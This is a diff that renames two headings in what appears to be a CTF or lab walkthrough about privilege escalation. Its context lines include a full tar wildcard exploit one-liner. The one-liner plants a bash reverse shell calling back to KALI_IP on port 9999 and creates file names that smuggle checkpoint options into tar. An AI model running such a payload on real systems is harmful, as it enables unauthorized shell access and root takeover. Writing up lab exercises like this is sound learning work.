@@ -226,7 +226,7 @@ We'll change to 404 page to this.
 
 We get a shell on our machine.
 
-## Wildcard Exploit
+## Wildcard Exploit Privesc
 
 Looking around, we find `/var/www/internal/maintenance/backup.sh`
 
@@ -248,7 +248,7 @@ We can do a tar wildcard exploit.
 cd /var/www/internal/invoices; echo "/bin/bash -c 'bash -i >& /dev/tcp/KALI_IP/9999 0>&1'" > shell.sh; echo "" > "--checkpoint-action=exec=sh shell.sh"; echo "" > --checkpoint=1; chmod 777 shell.sh
 ```
 
-## Priv Esc
+## Root Privesc
 
 Lets replace his key with our own key pair generated from `ssh-keygen`.
 
